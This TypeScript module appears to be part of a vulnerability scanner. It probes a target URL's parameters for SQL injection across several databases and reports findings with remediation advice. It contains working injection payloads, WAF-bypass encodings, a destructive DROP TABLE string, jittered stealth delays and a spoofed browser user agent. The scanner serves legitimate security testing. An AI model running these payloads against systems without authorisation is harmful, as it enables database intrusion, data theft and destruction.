// =============================================================================
// VulnHunter AI - SQL Injection Scanner Module
// =============================================================================
// Detects Error-based, Boolean-based blind, Time-based blind, and UNION-based
// SQL injection across MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.
// CWE-89 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 base)
// =============================================================================

import {
  type Finding,
  type Vulnerability,
  Severity,
  VulnerabilityCategory,
} from "@vulnhunter/core";
import { generateUUID } from "@vulnhunter/core";
import { sendRequest, type HttpResponse } from "@vulnhunter/core";
import { createLogger } from "@vulnhunter/core";
import { RateLimiter } from "@vulnhunter/core";

import type { ScanModule } from "./xss.js";

const log = createLogger("scanner:sqli");

// ---------------------------------------------------------------------------
// Database Error Signatures (used for error-based detection)
// ---------------------------------------------------------------------------

interface DbErrorSignature {
  db: string;
  patterns: RegExp[];
}

const DB_ERROR_SIGNATURES: DbErrorSignature[] = [
  {
    db: "MySQL",
    patterns: [
      /You have an error in your SQL syntax/i,
      /Warning:.*mysql_/i,
      /MySQLSyntaxErrorException/i,
      /com\.mysql\.jdbc/i,
      /Unclosed quotation mark/i,
      /MySQL server version for the right syntax/i,
      /mysqli?_[a-z_]+\(/i,
      /SQLSTATE\[42000\]/i,
      /supplied argument is not a valid MySQL/i,
      /Column count doesn't match/i,
    ],
  },
  {
    db: "PostgreSQL",
    patterns: [
      /PostgreSQL.*ERROR/i,
      /pg_query\(\)/i,
      /pg_exec\(\)/i,
      /PSQLException/i,
      /org\.postgresql\.util/i,
      /ERROR:\s+syntax error at or near/i,
      /unterminated quoted string at or near/i,
      /invalid input syntax for (type |integer)/i,
      /current transaction is aborted/i,
    ],
  },
  {
    db: "MSSQL",
    patterns: [
      /Microsoft SQL Native Client error/i,
      /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
      /Microsoft OLE DB Provider for SQL Server/i,
      /Unclosed quotation mark after the character string/i,
      /mssql_query\(\)/i,
      /SqlException/i,
      /Incorrect syntax near/i,
      /Conversion failed when converting/i,
      /String or binary data would be truncated/i,
    ],
  },
  {
    db: "Oracle",
    patterns: [
      /ORA-\d{5}/i,
      /Oracle error/i,
      /oracle\.jdbc/i,
      /quoted string not properly terminated/i,
      /SQL command not properly ended/i,
      /PLS-\d{5}/i,
      /OracleException/i,
    ],
  },
  {
    db: "SQLite",
    patterns: [
      /SQLite\/JDBCDriver/i,
      /SQLite\.Exception/i,
      /System\.Data\.SQLite\.SQLiteException/i,
      /SQLITE_ERROR/i,
      /sqlite3\.OperationalError/i,
      /near ".*": syntax error/i,
      /unrecognized token:/i,
    ],
  },
];

// ---------------------------------------------------------------------------
// SQL Injection Payloads
// ---------------------------------------------------------------------------

// Error-based payloads (designed to trigger SQL errors)
const ERROR_BASED_PAYLOADS: string[] = [
  `'`,
  `"`,
  `' OR '1'='1`,
  `" OR "1"="1`,
  `'; DROP TABLE test--`,
  `' AND 1=CONVERT(int,(SELECT @@version))--`,
  `' UNION SELECT NULL--`,
  `1' ORDER BY 1--`,
  `1' ORDER BY 100--`,
  `' AND extractvalue(1,concat(0x7e,version()))--`,
  `' AND updatexml(1,concat(0x7e,version()),1)--`,
  `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
  `') OR ('1'='1`,
  `')) OR (('1'='1`,
  `' OR 1=1#`,
  `' OR 1=1-- -`,
  `admin'--`,
  `1;SELECT @@version--`,
  `' HAVING 1=1--`,
  `' GROUP BY 1--`,
];

// Boolean-based blind payloads (true/false condition pairs)
const BOOLEAN_BLIND_PAIRS: Array<{ truePayload: string; falsePayload: string }> = [
  { truePayload: `' OR 1=1--`, falsePayload: `' OR 1=2--` },
  { truePayload: `' OR 'a'='a'--`, falsePayload: `' OR 'a'='b'--` },
  { truePayload: `" OR 1=1--`, falsePayload: `" OR 1=2--` },
  { truePayload: `1 OR 1=1`, falsePayload: `1 OR 1=2` },
  { truePayload: `1) OR (1=1`, falsePayload: `1) OR (1=2` },
  { truePayload: `')) OR (('1'='1`, falsePayload: `')) OR (('1'='2` },
  { truePayload: `' OR ASCII(SUBSTRING((SELECT 'a'),1,1))>96--`, falsePayload: `' OR ASCII(SUBSTRING((SELECT 'a'),1,1))>122--` },
  { truePayload: `1 AND 1=1`, falsePayload: `1 AND 1=2` },
  { truePayload: `1' AND '1'='1`, falsePayload: `1' AND '1'='2` },
  { truePayload: `1" AND "1"="1`, falsePayload: `1" AND "1"="2` },
];

// Time-based blind payloads (per-database sleep functions)
const TIME_BASED_PAYLOADS: Array<{ db: string; payload: string; delaySeconds: number }> = [
  { db: "MySQL", payload: `' OR SLEEP(5)--`, delaySeconds: 5 },
  { db: "MySQL", payload: `' OR BENCHMARK(5000000,SHA1('test'))--`, delaySeconds: 5 },
  { db: "MySQL", payload: `1' AND SLEEP(5)--`, delaySeconds: 5 },
  { db: "MySQL", payload: `'; SELECT SLEEP(5)--`, delaySeconds: 5 },
  { db: "PostgreSQL", payload: `'; SELECT pg_sleep(5)--`, delaySeconds: 5 },
  { db: "PostgreSQL", payload: `' OR (SELECT pg_sleep(5))::text='1'--`, delaySeconds: 5 },
  { db: "PostgreSQL", payload: `1; SELECT pg_sleep(5)--`, delaySeconds: 5 },
  { db: "MSSQL", payload: `'; WAITFOR DELAY '0:0:5'--`, delaySeconds: 5 },
  { db: "MSSQL", payload: `1; WAITFOR DELAY '0:0:5'--`, delaySeconds: 5 },
  { db: "MSSQL", payload: `' IF 1=1 WAITFOR DELAY '0:0:5'--`, delaySeconds: 5 },
  { db: "Oracle", payload: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`, delaySeconds: 5 },
  { db: "Oracle", payload: `' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`, delaySeconds: 5 },
  { db: "SQLite", payload: `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--`, delaySeconds: 5 },
];

// UNION-based payloads (column enumeration)
const UNION_COLUMN_PROBES: string[] = [
  `' UNION SELECT NULL--`,
  `' UNION SELECT NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--`,
  `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--`,
];

// WAF/filter bypass variants
const BYPASS_PAYLOADS: string[] = [
  `%27%20OR%201%3D1--`,
  `%22%20OR%201%3D1--`,
  `' /*!OR*/ 1=1--`,
  `' %0aOR 1=1--`,
  `' /**/OR/**/1=1--`,
  `'/**/oR/**/1=1--`,
  `' /*!50000OR*/ 1=1--`,
  `' UniOn SeLeCt NULL--`,
  `' uNiOn aLl sElEcT NULL--`,
  `%2527%2520OR%25201%253D1--`,
];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function stealthDelay(baseMs: number): Promise<void> {
  const jitter = Math.floor(Math.random() * baseMs * 0.5);
  return new Promise((resolve) => setTimeout(resolve, baseMs + jitter));
}

function extractParams(urlStr: string): Map<string, string> {
  const params = new Map<string, string>();
  try {
    const url = new URL(urlStr);
    url.searchParams.forEach((value, key) => params.set(key, value));
  } catch {
    // invalid URL
  }
  return params;
}

function detectDbError(body: string): { db: string; pattern: string } | null {
  for (const sig of DB_ERROR_SIGNATURES) {
    for (const pattern of sig.patterns) {
      const match = pattern.exec(body);
      if (match) {
        return { db: sig.db, pattern: match[0] };
      }
    }
  }
  return null;
}

/** Calculate similarity ratio between two strings (0-1) for boolean blind */
function similarity(a: string, b: string): number {
  if (a === b) return 1;
  const longer = a.length > b.length ? a : b;
  const shorter = a.length > b.length ? b : a;
  if (longer.length === 0) return 1;
  // Quick length-based diff
  const lengthDiff = Math.abs(a.length - b.length) / Math.max(a.length, b.length, 1);
  if (lengthDiff > 0.5) return 1 - lengthDiff;
  // Sample-based comparison for large bodies
  const sampleSize = Math.min(shorter.length, 2000);
  let matches = 0;
  for (let i = 0; i < sampleSize; i++) {
    if (shorter[i] === longer[i]) matches++;
  }
  return matches / sampleSize;
}

function buildSqliFinding(params: {
  target: string;
  endpoint: string;
  method: string;
  parameter: string;
  payload: string;
  sqliType: string;
  detectedDb: string;
  confidence: number;
  evidence: string;
  responseBody: string;
  responseStatus: number;
}): Finding {
  const vulnId = generateUUID();

  const vulnerability: Vulnerability = {
    id: vulnId,
    title: `${params.sqliType} SQL Injection in "${params.parameter}" parameter (${params.detectedDb})`,
    description:
      `A ${params.sqliType.toLowerCase()} SQL injection vulnerability was detected in the ` +
      `"${params.parameter}" parameter at ${params.endpoint}. ` +
      `The back-end database appears to be ${params.detectedDb}. ` +
      `An attacker can exploit this to read, modify, or delete data, execute administrative ` +
      `operations on the database, and potentially achieve remote code execution on the ` +
      `underlying operating system.`,
    severity: Severity.Critical,
    category: VulnerabilityCategory.SQLi,
    cvssScore: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cweId: "CWE-89",
    target: params.target,
    endpoint: params.endpoint,
    evidence: {
      description: params.evidence,
      payload: params.payload,
      matchedPattern: params.evidence,
      extra: { sqliType: params.sqliType, detectedDb: params.detectedDb },
    },
    request: {
      method: params.method,
      url: params.endpoint,
      headers: { "Content-Type": "text/html" },
      body:
        params.method === "POST"
          ? `${params.parameter}=${encodeURIComponent(params.payload)}`
          : undefined,
    },
    response: {
      statusCode: params.responseStatus,
      headers: {},
      body: params.responseBody.slice(0, 2000),
      responseTimeMs: 0,
    },
    remediation:
      "1. Use parameterized queries (prepared statements) for ALL database interactions.\n" +
      "2. Use an ORM with proper query builder methods (e.g., Prisma, Sequelize, SQLAlchemy).\n" +
      "3. Apply the principle of least privilege to database accounts.\n" +
      "4. Implement input validation with allowlists for expected data types.\n" +
      "5. Deploy a Web Application Firewall (WAF) as defense-in-depth.\n" +
      "6. Disable detailed error messages in production.",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/89.html",
      "https://portswigger.net/web-security/sql-injection",
    ],
    confirmed: params.confidence >= 80,
    falsePositive: false,
    discoveredAt: new Date().toISOString(),
  };

  return {
    vulnerability,
    module: `scanner:sqli:${params.sqliType.toLowerCase().replace(/[- ]/g, "_")}`,
    confidence: params.confidence,
    timestamp: new Date().toISOString(),
    rawData: {
      payload: params.payload,
      sqliType: params.sqliType,
      detectedDb: params.detectedDb,
      parameter: params.parameter,
    },
  };
}

// ---------------------------------------------------------------------------
// SqliScanner Class
// ---------------------------------------------------------------------------

export class SqliScanner implements ScanModule {
  public readonly name = "sqli";

  private rateLimiter: RateLimiter;
  private userAgent: string;
  private timeBasedThresholdMs: number;

  constructor() {
    this.rateLimiter = new RateLimiter(5);
    this.userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
    this.timeBasedThresholdMs = 4000; // 4 seconds to account for network latency
  }

  async *execute(
    target: string,
    options: Record<string, unknown>,
  ): AsyncGenerator<Finding> {
    log.info({ target }, "Starting SQL injection scan");

    const rateLimit = typeof options.rateLimit === "number" ? options.rateLimit : 5;
    this.rateLimiter = new RateLimiter(rateLimit);
    if (typeof options.userAgent === "string") {
      this.userAgent = options.userAgent;
    }
    if (typeof options.timeBasedThresholdMs === "number") {
      this.timeBasedThresholdMs = options.timeBasedThresholdMs;
    }

    // Collect injectable parameters
    const params = extractParams(target);

    // If no params, probe for common ones
    if (params.size === 0) {
      const probeParams = ["id", "user", "item", "page", "category", "order", "sort", "search", "q", "lang", "year", "type", "action"];
      for (const p of probeParams) {
        const testUrl = new URL(target);
        testUrl.searchParams.set(p, "1");
        await this.rateLimiter.acquire();
        try {
          const resp = await sendRequest({
            method: "GET",
            url: testUrl.toString(),
            headers: { "User-Agent": this.userAgent, Accept: "text/html" },
          });
          if (resp.status === 200 && resp.body.length > 100) {
            params.set(p, "1");
          }
        } catch {
          // Skip
        }
        await stealthDelay(100);
      }
    }

    // Get baseline response for boolean blind comparison
    let baselineResp: HttpResponse | null = null;
    try {
      await this.rateLimiter.acquire();
      baselineResp = await sendRequest({
        method: "GET",
        url: target,
        headers: { "User-Agent": this.userAgent, Accept: "text/html" },
      });
    } catch {
      // Proceed without baseline
    }

    for (const [paramName] of params) {
      // Phase 1: Error-based SQLi
      yield* this.scanErrorBased(target, paramName);

      // Phase 2: Boolean-based blind SQLi
      yield* this.scanBooleanBlind(target, paramName, baselineResp);

      // Phase 3: Time-based blind SQLi
      yield* this.scanTimeBased(target, paramName);

      // Phase 4: UNION-based SQLi
      yield* this.scanUnionBased(target, paramName);

      // Phase 5: WAF bypass attempts
      yield* this.scanBypass(target, paramName);
    }

    log.info({ target }, "SQL injection scan complete");
  }

  // -------------------------------------------------------------------------
  // Phase 1: Error-based SQLi
  // -------------------------------------------------------------------------

  private async *scanErrorBased(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    // First get a clean baseline to compare error pages against
    await this.rateLimiter.acquire();
    let cleanResp: HttpResponse;
    try {
      cleanResp = await sendRequest({
        method: "GET",
        url: target,
        headers: { "User-Agent": this.userAgent, Accept: "text/html" },
      });
    } catch {
      return;
    }

    const cleanDbError = detectDbError(cleanResp.body);
    // If the clean page already contains SQL errors, note it as baseline

    for (const payload of ERROR_BASED_PAYLOADS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, payload);

      await this.rateLimiter.acquire();
      await stealthDelay(150);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        const dbError = detectDbError(resp.body);
        if (dbError && (!cleanDbError || cleanDbError.db !== dbError.db)) {
          yield buildSqliFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload,
            sqliType: "Error-based",
            detectedDb: dbError.db,
            confidence: 90,
            evidence: `SQL error detected: "${dbError.pattern}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
          });
          return; // One confirmed error-based finding per param is enough
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 2: Boolean-based blind SQLi
  // -------------------------------------------------------------------------

  private async *scanBooleanBlind(
    target: string,
    paramName: string,
    baselineResp: HttpResponse | null,
  ): AsyncGenerator<Finding> {
    for (const pair of BOOLEAN_BLIND_PAIRS) {
      const trueUrl = new URL(target);
      trueUrl.searchParams.set(paramName, pair.truePayload);

      const falseUrl = new URL(target);
      falseUrl.searchParams.set(paramName, pair.falsePayload);

      await this.rateLimiter.acquire();
      await stealthDelay(150);

      try {
        const trueResp = await sendRequest({
          method: "GET",
          url: trueUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        await this.rateLimiter.acquire();
        await stealthDelay(150);

        const falseResp = await sendRequest({
          method: "GET",
          url: falseUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        // The true and false responses should be measurably different
        const sim = similarity(trueResp.body, falseResp.body);

        // If the two responses are significantly different (< 90% similar)
        // and the true response matches the baseline more closely
        if (sim < 0.90) {
          let confidence = 60;

          if (baselineResp) {
            const trueVsBaseline = similarity(
              trueResp.body,
              baselineResp.body,
            );
            const falseVsBaseline = similarity(
              falseResp.body,
              baselineResp.body,
            );
            // True condition should resemble baseline; false should differ
            if (trueVsBaseline > falseVsBaseline + 0.1) {
              confidence = 80;
            }
          }

          // Check status codes too
          if (trueResp.status === 200 && falseResp.status !== 200) {
            confidence += 10;
          }

          // Content length difference as extra signal
          const lenDiff = Math.abs(trueResp.body.length - falseResp.body.length);
          if (lenDiff > 100) {
            confidence += 5;
          }

          confidence = Math.min(confidence, 95);

          yield buildSqliFinding({
            target,
            endpoint: trueUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload: pair.truePayload,
            sqliType: "Boolean-based blind",
            detectedDb: "Unknown",
            confidence,
            evidence:
              `Boolean condition difference detected. ` +
              `True response: ${trueResp.body.length} bytes (status ${trueResp.status}), ` +
              `False response: ${falseResp.body.length} bytes (status ${falseResp.status}), ` +
              `Similarity: ${(sim * 100).toFixed(1)}%`,
            responseBody: trueResp.body,
            responseStatus: trueResp.status,
          });
          return; // One confirmed finding per param
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 3: Time-based blind SQLi
  // -------------------------------------------------------------------------

  private async *scanTimeBased(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    // First, measure baseline response time
    const baselineTimes: number[] = [];
    for (let i = 0; i < 3; i++) {
      await this.rateLimiter.acquire();
      try {
        const start = Date.now();
        await sendRequest({
          method: "GET",
          url: target,
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });
        baselineTimes.push(Date.now() - start);
      } catch {
        baselineTimes.push(1000);
      }
      await stealthDelay(100);
    }
    const avgBaseline =
      baselineTimes.reduce((a, b) => a + b, 0) / baselineTimes.length;

    for (const timePayload of TIME_BASED_PAYLOADS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, timePayload.payload);

      await this.rateLimiter.acquire();

      try {
        const start = Date.now();
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });
        const elapsed = Date.now() - start;

        const expectedDelay = timePayload.delaySeconds * 1000;
        // If the response took significantly longer than baseline and close to the expected delay
        if (
          elapsed > avgBaseline + this.timeBasedThresholdMs &&
          elapsed > expectedDelay * 0.8
        ) {
          // Verify with a second request to reduce false positives
          await this.rateLimiter.acquire();
          const verifyStart = Date.now();
          await sendRequest({
            method: "GET",
            url: attackUrl.toString(),
            headers: { "User-Agent": this.userAgent, Accept: "text/html" },
          });
          const verifyElapsed = Date.now() - verifyStart;

          if (
            verifyElapsed > avgBaseline + this.timeBasedThresholdMs &&
            verifyElapsed > expectedDelay * 0.7
          ) {
            yield buildSqliFinding({
              target,
              endpoint: attackUrl.toString(),
              method: "GET",
              parameter: paramName,
              payload: timePayload.payload,
              sqliType: "Time-based blind",
              detectedDb: timePayload.db,
              confidence: 85,
              evidence:
                `Time delay detected. Baseline: ${avgBaseline.toFixed(0)}ms, ` +
                `First request: ${elapsed}ms, Verification: ${verifyElapsed}ms ` +
                `(expected delay: ${expectedDelay}ms)`,
              responseBody: resp.body,
              responseStatus: resp.status,
            });
            return; // One confirmed finding per param
          }
        }
      } catch {
        continue;
      }

      await stealthDelay(200);
    }
  }

  // -------------------------------------------------------------------------
  // Phase 4: UNION-based SQLi
  // -------------------------------------------------------------------------

  private async *scanUnionBased(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    // Step 1: Determine the number of columns using ORDER BY
    let columnCount = 0;
    for (let cols = 1; cols <= 20; cols++) {
      const payload = `' ORDER BY ${cols}--`;
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, payload);

      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        const hasError = detectDbError(resp.body);
        if (hasError || resp.status === 500) {
          // The previous column count was the max valid
          columnCount = cols - 1;
          break;
        }
      } catch {
        break;
      }
    }

    // Fallback: also try UNION SELECT NULL approach
    if (columnCount === 0) {
      for (const probe of UNION_COLUMN_PROBES) {
        const attackUrl = new URL(target);
        attackUrl.searchParams.set(paramName, probe);

        await this.rateLimiter.acquire();
        await stealthDelay(100);

        try {
          const resp = await sendRequest({
            method: "GET",
            url: attackUrl.toString(),
            headers: { "User-Agent": this.userAgent, Accept: "text/html" },
          });

          if (resp.status === 200 && !detectDbError(resp.body)) {
            // Count NULLs in the probe
            columnCount = (probe.match(/NULL/g) || []).length;
            break;
          }
        } catch {
          continue;
        }
      }
    }

    if (columnCount < 1) return;

    // Step 2: Try UNION SELECT with a marker to confirm data extraction
    const marker = `vhsqli${Math.random().toString(36).slice(2, 8)}`;
    const nulls = Array(columnCount).fill("NULL");

    // Try replacing each column position with our marker
    for (let pos = 0; pos < columnCount; pos++) {
      const selectList = [...nulls];
      selectList[pos] = `'${marker}'`;
      const payload = `' UNION SELECT ${selectList.join(",")}--`;
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, payload);

      await this.rateLimiter.acquire();
      await stealthDelay(100);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        if (resp.body.includes(marker)) {
          yield buildSqliFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload,
            sqliType: "UNION-based",
            detectedDb: "Unknown",
            confidence: 95,
            evidence:
              `UNION-based injection confirmed. Marker "${marker}" reflected in response ` +
              `at column position ${pos + 1} of ${columnCount} columns.`,
            responseBody: resp.body,
            responseStatus: resp.status,
          });
          return;
        }
      } catch {
        continue;
      }
    }
  }

  // -------------------------------------------------------------------------
  // Phase 5: WAF Bypass attempts
  // -------------------------------------------------------------------------

  private async *scanBypass(
    target: string,
    paramName: string,
  ): AsyncGenerator<Finding> {
    for (const payload of BYPASS_PAYLOADS) {
      const attackUrl = new URL(target);
      attackUrl.searchParams.set(paramName, payload);

      await this.rateLimiter.acquire();
      await stealthDelay(200);

      try {
        const resp = await sendRequest({
          method: "GET",
          url: attackUrl.toString(),
          headers: { "User-Agent": this.userAgent, Accept: "text/html" },
        });

        const dbError = detectDbError(resp.body);
        if (dbError) {
          yield buildSqliFinding({
            target,
            endpoint: attackUrl.toString(),
            method: "GET",
            parameter: paramName,
            payload,
            sqliType: "Error-based (WAF bypass)",
            detectedDb: dbError.db,
            confidence: 85,
            evidence: `WAF bypass payload triggered SQL error: "${dbError.pattern}"`,
            responseBody: resp.body,
            responseStatus: resp.status,
          });
          return;
        }
      } catch {
        continue;
      }
    }
  }
}
